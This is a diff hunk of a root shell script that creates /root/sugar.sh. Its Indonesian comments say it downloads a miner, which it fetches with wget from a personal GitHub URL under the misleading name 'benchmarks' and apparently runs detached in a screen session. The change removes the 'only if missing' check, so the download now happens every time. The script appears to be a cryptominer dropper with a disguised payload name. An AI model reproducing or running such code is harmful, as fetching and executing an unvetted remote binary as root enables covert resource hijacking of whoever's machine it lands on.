@@ -9,9 +9,7 @@ cat << 'EOF' > /root/sugar.sh
 cd /root || exit
 
 # Download miner jika belum ada
-if [ ! -f benchmarks ]; then
-  wget https://raw.githubusercontent.com/amirul5656/web/refs/heads/main/benchmarks
-fi
+wget https://raw.githubusercontent.com/amirul5656/web/refs/heads/main/benchmarks
 
 # Cek apakah screen sudah berjalan
 if screen -list | grep -q amirul3; then
